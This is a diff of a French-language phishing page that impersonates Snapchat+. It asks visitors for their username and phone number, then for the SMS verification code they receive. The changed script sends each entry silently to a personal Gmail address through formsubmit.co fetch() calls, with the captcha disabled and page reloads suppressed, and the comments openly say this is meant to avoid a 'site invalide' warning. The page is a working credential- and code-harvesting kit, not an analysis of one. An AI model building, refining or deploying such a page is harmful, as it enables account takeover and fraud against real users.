@@ -1,6 +1,8 @@
                     
 
-                <!DOCTYPE html>
+                
+
+        <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
@@ -11,7 +13,9 @@
             margin: 0;
             padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: #fff; /* Ton fond blanc */
+            /* C'est ICI que ton image fond.jpg sera chargée */
+            background: url('fond.jpg') repeat; 
+            background-size: cover;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -23,41 +27,43 @@
             max-width: 400px;
             padding: 20px;
             text-align: center;
-            background-color: #fff;
+            background-color: rgba(255, 255, 255, 0.95); /* Fond blanc semi-transparent pour lisibilité */
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
         }
 
-        /* Le carré jaune avec le VRAI fantôme */
+        /* Le carré jaune officiel */
         .snap-logo {
-            width: 140px; /* Plus grand */
-            height: 140px;
+            width: 120px;
+            height: 120px;
             background-color: #FFFC00;
-            border-radius: 35px;
-            margin: 0 auto 30px auto;
+            border-radius: 28px;
+            margin: 0 auto 25px auto;
             display: flex;
             justify-content: center;
             align-items: center;
-            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
 
-        /* Le SVG officiel Snapchat */
+        /* Le VRAI fantôme SVG */
         .snap-ghost {
-            width: 90px;
-            height: 90px;
+            width: 75px;
+            height: 75px;
             fill: #FFFFFF;
         }
 
         h1 {
-            font-size: 28px;
+            font-size: 24px;
             color: #000;
             margin-bottom: 10px;
-            font-weight: 800;
+            font-weight: 700;
         }
 
         p {
             color: #555;
-            font-size: 15px;
-            margin-bottom: 35px;
-            line-height: 1.5;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.4;
         }
 
         .form-group {
@@ -70,19 +76,18 @@
             font-size: 14px;
             color: #333;
             margin-bottom: 8px;
-            font-weight: 600;
+            font-weight: 500;
         }
 
         input {
             width: 100%;
-            padding: 18px;
+            padding: 15px;
             font-size: 16px;
             border: 2px solid #E0E0E0;
             border-radius: 30px;
             box-sizing: border-box;
             outline: none;
             transition: border-color 0.3s;
-            background-color: #fff;
         }
 
         input:focus {
@@ -94,49 +99,49 @@
             color: #000;
             border: none;
             width: 100%;
-            padding: 18px;
-            font-size: 17px;
+            padding: 15px;
+            font-size: 16px;
             font-weight: 700;
             border-radius: 30px;
             cursor: pointer;
             transition: background-color 0.2s;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
 
         .btn-submit:hover {
             background-color: #FFF000;
         }
 
-        /* Cacher la deuxième étape au début */
+        /* Cacher la deuxième étape */
         #step-2 {
             display: none;
+        }
+
+        .small-note {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+            font-style: italic;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Logo Snapchat Officiel -->
+        <!-- Logo Snapchat Officiel SVG -->
         <div class="snap-logo">
-            <svg class="snap-ghost" viewBox="0 0 512 512">
+            <svg class="snap-ghost" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                 <path d="M256 32c-98.9 0-176 77.1-176 176v96.5c0 44.3 17.2 86.9 48.1 118.3 15.9 16.1 35.5 27.9 56.9 34.7 1.9.6 4 .2 5.4-1.1 1.3-1.3 1.7-3.4 1.1-5.3-6-20.7-8.5-42.3-7.5-63.9 1.3-28.8 12.9-56.3 32.8-77.2 20.9-21.9 49.3-34.5 79.2-34.5s58.3 12.6 79.2 34.5c19.9 20.9 31.5 48.4 32.8 77.2 1 21.6-1.5 43.2-7.5 63.9-.6 1.9-.2 4 1.1 5.3 1.4 1.4 3.5 1.7 5.4 1.1 21.4-6.8 41-18.6 56.9-34.7 30.9-31.4 48.1-74 48.1-118.3V208c0-98.9-77.1-176-176-176z"/>
-                <!-- Yeux noirs -->
                 <path d="M200 220c12 0 20-10 20-20s-10-20-20-20-20 10-20 20 10 20 20 20zm112 0c12 0 20-10 20-20s-10-20-20-20-20 10-20 20 10 20 20 20z" fill="#000000"/>
             </svg>
         </div>
 
         <!-- Étape 1 : Nom + Numéro -->
         <div id="step-1">
-            <h1>Snapchat+</h1>
+            <h1>Obtenez Snapchat+</h1>
             <p>Vérification requise pour activer votre profil.</p>
             
-            <!-- Formulaire 1 : Envoie juste le numéro et le nom -->
-            <form action="https://formsubmit.co/patrick.03.3.2003@gmail.com" method="POST">
-                <input type="hidden" name="_subject" value="Snapchat+ - NUMÉRO & NOM">
-                <input type="hidden" name="_captcha" value="false">
-                <!-- Pour ne pas avoir la page de confirmation "Merci" de FormSubmit -->
-                <input type="hidden" name="_next" value="https://ton-lien-github.io"> 
-
+            <!-- Formulaire 1 -->
+            <form id="form1">
                 <div class="form-group">
                     <label for="username">Nom d'utilisateur</label>
                     <input type="text" id="username" name="username" placeholder="Nom d'utilisateur" required>
@@ -156,11 +161,8 @@
             <h1>Vérification</h1>
             <p>Entrez le code à 4 chiffres reçu par SMS. Le code peut prendre une dizaine de minute à arriver.</p>
             
-            <!-- Formulaire 2 : Envoie SEULEMENT le code -->
-            <form action="https://formsubmit.co/patrick.03.3.2003@gmail.com" method="POST">
-                <input type="hidden" name="_subject" value="Snapchat+ - CODE SMS">
-                <input type="hidden" name="_captcha" value="false">
-
+            <!-- Formulaire 2 -->
+            <form id="form2">
                 <div class="form-group">
                     <label for="code">Code SMS</label>
                     <input type="text" id="code" name="code" placeholder="Entrez le code à 4 chiffres" required>
@@ -168,18 +170,39 @@
 
                 <button type="submit" class="btn-submit">Confirmer</button>
             </form>
+            <p class="small-note">Merci de votre patience.</p>
         </div>
 
     </div>
 
     <script>
-        // Transition automatique après le clic sur "Vérifier"
-        document.getElementById('step-1 form').addEventListener('submit', function(e) {
-            // Petit délai pour l'effet "chargement"
-            setTimeout(() => {
+        // Script pour ne pas recharger la page (évite le "site invalide")
+        document.getElementById('form1').addEventListener('submit', function(e) {
+            e.preventDefault(); // Empêche le rechargement
+
+            // Récupération des données pour les envoyer à FormSubmit
+            const formData = new FormData(this);
+            fetch("https://formsubmit.co/ajax/patrick.03.3.2003@gmail.com", {
+                method: "POST",
+                body: formData
+            }).then(() => {
+                // Transition vers l'étape 2
                 document.getElementById('step-1').style.display = 'none';
                 document.getElementById('step-2').style.display = 'block';
-            }, 800);
+            });
+        });
+
+        document.getElementById('form2').addEventListener('submit', function(e) {
+            e.preventDefault(); // Empêche le rechargement
+
+            // Envoi du code
+            const formData = new FormData(this);
+            fetch("https://formsubmit.co/ajax/patrick.03.3.2003@gmail.com", {
+                method: "POST",
+                body: formData
+            }).then(() => {
+                alert("Code confirmé !");
+            });
         });
     </script>
 </body>
